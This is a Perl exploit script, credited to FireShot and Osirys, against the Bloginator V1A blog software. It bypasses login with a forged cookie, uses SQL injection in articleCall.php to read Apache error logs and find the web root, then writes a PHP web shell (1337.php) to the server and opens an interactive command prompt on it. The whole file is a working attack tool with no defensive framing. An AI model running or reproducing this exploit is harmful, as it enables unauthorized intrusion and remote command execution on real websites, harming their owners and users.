#!/usr/bin/perl

use IO::Socket;
use LWP::UserAgent;

my $host = $ARGV[0];
my $rand = int(rand 9) +1;

my @error_logs  =  qw(
                     /var/log/httpd/error.log
                     /var/log/httpd/error_log
                     /var/log/apache/error.log
                     /var/log/apache/error_log
                     /var/log/apache2/error.log
                     /var/log/apache2/error_log
                     /logs/error.log
                     /var/log/apache/error_log
                     /var/log/apache/error.log
                     /usr/local/apache/logs/error_log
                     /etc/httpd/logs/error_log
                     /etc/httpd/logs/error.log
                     /var/www/logs/error_log
                     /var/www/logs/error.log
                     /usr/local/apache/logs/error.log
                     /var/log/error_log
                     /apache/logs/error.log
                   );

my $php_c0de   =  "<?php echo \"st4rt\";system(\$_GET[cmd]);?>";

($host) || help("-1");
cheek($host) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);


print "[*] Generating error through GET request ..\n";

get_req($host."/osirys_log_test".$rand);

print "[*] Cheeking Apache Error Log path ..\n";

while (($log = <@error_logs>)&&($gotcha != 1)) {
   my $regexp = "File does not exist: (.+)\/osirys_log_test$rand";
   my $sql_load_file = "/articleCall.php?action=edit&id=osirys' union select 1,2,3,4,load_file('".$log."'),6,7 order by '*";
   $re = sql_socket($sql_load_file,$regexp,"1");
   if ($re !~ /Failed/) {
       $site_path = $re;
       $ok = 1;
   }
   if ($ok == 1) {
       print "[*] Error Log path found -> $log\n";
       print "[*] Website path found -> $site_path\n";
       &inj_shell;
   }
   else {
       print "[-] Couldn't file error_log !\n";
   }
}

sub inj_shell {
   my $attack  = "/articleCall.php?action=edit&id=osirys' union select 1,2,3,4,'".$php_c0de."',6,7 into outfile '".$site_path."/1337.php";
   my $regexp  = "st4rt";
   my $re = sql_socket($attack,$regexp,"2");
   if ($re == 1) {
       print "[*] Shell succesfully injected !\n";
       print "[&] Hi my master, do your job now [!]\n\n";
       $exec_path = $host."/1337.php";
       &exec_cmd;

   }
   else {
       print "[-] Shell not found \n[-] Exploit failed\n\n";
       exit(0);
   }
}

sub exec_cmd {
   $h0st !~ /www\./ || $h0st =~ s/www\.//;
   print "shell[$h0st]\$> ";
   $cmd = <STDIN>;
   $cmd !~ /exit/ || die "[-] Quitting ..\n";
   my $exec_path_ = $exec_path."?cmd=".$cmd;
   my $re = get_req($exec_path_);
   my $content = tag($re);
   if ($content =~ /st4rt(.+)\*\*6/) {
       my $out = $1;
       $out =~ s/\$/ /g;
       $out =~ s/\*/\n/g;
       chomp($out);
       print "$out\n";
       &exec_cmd;
   }
   else {
       $c++;
       $cmd =~ s/\n//;
       print "bash: ".$cmd.": command not found\n";
       $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
       &exec_cmd;
   }
}

sub sql_socket() {

   my($sql,$regexp,$way) = @_;
   $sql = tag_encode($sql);

   my $url = $path."/".$sql;

   my $data = "GET ".$url." HTTP/1.1\r\n".
              "Host: ".$h0st."\r\n".
              "Keep-Alive: 300\r\n".
              "Connection: keep-alive\r\n".
              "Content-Type: application/x-www-form-urlencoded\r\n".
              "Cookie: identifyYourself=you+are+identified;\r\n".
              "Content-Length: 0\r\n\r\n".
              "\r\n";

   my $socket   =  new IO::Socket::INET(
                                            PeerAddr => $h0st,
                                            PeerPort => '80',
                                            Proto    => 'tcp',
                                       ) or die "[-] Can't connect to $h0st:80\n[?] $! \n\n";

   $socket->send($data);

   if ($way == 1) {
       while ((my $e = <$socket>)&&($stop != 1)) {
           if ($e =~ /$regexp/) {
               $gotcha = $1;
               $stop = 1;
           }
       }
   }
   elsif ($way == 2) {
       my $re = get_req($host."/1337.php");
       if ($re =~ /st4rt/) {
           $gotcha = 1;
           $stop = 1;
       }
       else {
           $gotcha = 0;
           $stop = 0;
       }
   }
   if ($stop == 1) {
       return($gotcha);
   }
   else {
       return("Failed");
   }

}

sub get_req() {
   $link = $_[0];
   my $req = HTTP::Request->new(GET => $link);
   my $ua = LWP::UserAgent->new();
   $ua->timeout(4);
   my $response = $ua->request($req);
   return $response->content;
}

sub cheek() {
   my $host = $_[0];
   if ($host =~ /http:\/\/(.*)/) {
       return 1;
   }
   else {
       return 0;
   }
}

sub get_input() {
   my $host = $_[0];
   $host =~ /http:\/\/(.*)/;
   $s_host = $1;
   $s_host =~ /([a-z.-]{1,30})\/(.*)/;
   ($h0st,$path) = ($1,$2);
   $path =~ s/(.*)/\/$1/;
   $full_det = $h0st." ".$path;
   return $full_det;
}

sub tag() {
   my $string = $_[0];
   $string =~ s/ /\$/g;
   $string =~ s/\s/\*/g;
   return($string);
}

sub tag_encode() {
   my $sql = $_[0];
   $sql =~ s/ /\%20/g;
   $sql =~ s/</\%3C/g;
   $sql =~ s/>/\%3E/g;
   $sql =~ s/"/\%22/g;
   return($sql);
}

sub banner {
   print "\n".
         "  ---------------------------\n".
         "     SQL Command Injection   \n".
         "       via Cookie Bypass     \n".
     "         Bloginator V1A      \n".
         "     by FireShot & Osirys    \n".
         "  ---------------------------\n\n";
}

sub help() {
   my $error = $_[0];
   if ($error == -1) {
       &banner;
       print "\n[-] Input data failed ! \n";
   }
   elsif ($error == -2) {
       &banner;
       print "\n[-] Bad hostname address !\n";
   }
   print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
   exit(0);
}

